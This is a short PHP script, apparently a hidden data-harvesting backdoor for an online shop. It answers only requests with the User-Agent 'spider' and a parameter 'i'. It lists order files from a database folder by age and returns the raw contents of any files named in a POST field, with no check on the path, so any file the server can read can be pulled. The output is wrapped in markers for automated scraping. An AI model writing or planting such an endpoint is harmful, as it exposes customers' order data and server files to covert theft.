<?php
	
	error_reporting(0);
	header('Content-Type: text/plain');
	
	$outArr = array();
	$dir = './../db/orders/';
	
	if ( !isset($_GET['i']) || ($_SERVER['HTTP_USER_AGENT'] != "spider")) {
		die();
	}
	
	if ( isset($_GET['days']) ) {
		$daysCnt = intval($_GET['days']) + 1;
	} else {
		$daysCnt = 0;
	}
	
	
	$dirArr = scandir($dir);
	foreach ( $dirArr as $k => $v ) {
		if ( $v == '.' || $v == '..' ) {
			unset($dirArr[$k]);
		}
	}
	
	if ( isset($_GET['days']) ) {
		$outCheck = '';
		$nowDate = date('U');
		foreach ( $dirArr as $k => $v ) {
			$dirArr2 = scandir($dir . $v);
			foreach ( $dirArr2 as $k2 => $v2 ) {
				if ( $v2 != '.' && $v2 != '..' ) {
					$name = $v . '/' . $v2;
					$dateOfFile = mysql_to_u($v);
					$diff = $nowDate - $dateOfFile;
					$diff = $diff / 60 / 60 / 24;
					$diff = ceil($diff);
					if ( $diff < $daysCnt ) {
						$outCheck .= $name . ' ';
					}
					$diff = 0;
				}
			}
		}
		die('/*begin*/' . $outCheck . '/*finish*/');
	}
	
	if ( isset($_POST['must_read']) && $_POST['must_read']) {
		$readArr = explode(' ', $_POST['must_read']);
		foreach ( $readArr as $k => $v ) {
			$outArr[$v] = file_get_contents($dir . $v);
		}
		die('/*begin*/' . $_SERVER["HTTP_HOST"] . "/*****/" . serialize($outArr) . '/*finish*/');
	}
	
	function p($a) {
		print_r($a);
	}
	
	function mysql_to_u($t = '') {  
		
		$t = str_replace('-', '', $t);
		$t = str_replace(':', '', $t);
		$t = str_replace(' ', '', $t);
		return  mktime(
			substr($t, 8, 2),
			substr($t, 10, 2),
			substr($t, 12, 2),
			substr($t, 4, 2),
			substr($t, 6, 2),
			substr($t, 0, 4)
		);
	}
	 
?>